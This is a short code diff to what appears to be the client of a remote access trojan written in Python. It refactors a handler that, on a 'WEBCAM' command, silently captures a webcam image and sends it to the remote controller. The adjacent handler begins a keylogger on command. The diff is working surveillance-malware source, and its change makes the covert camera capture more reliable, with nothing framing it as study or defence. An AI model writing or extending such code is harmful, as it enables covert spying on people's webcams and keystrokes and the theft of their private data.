@@ -410,18 +410,14 @@ class Client(object):
             if data[0] == 'WEBCAM':
                 vc = cv2.VideoCapture(0)
                 s, img = vc.read()
+                vc.release()
                 if s:
                     is_success, arr = cv2.imencode('.png', img)
                     if is_success:
-                        with BytesIO() as output:
-                            output.write(arr)
-                            content = output.getvalue()
-                        self.send(content)
+                        self.send(arr.tobytes())
                         logging.info('Captured Webcam image')
-                        vc.release()
                         continue
                 self.send(b'ERROR')
-                vc.release()
                 continue
 
             if data[0] == 'START_KEYLOGGER':
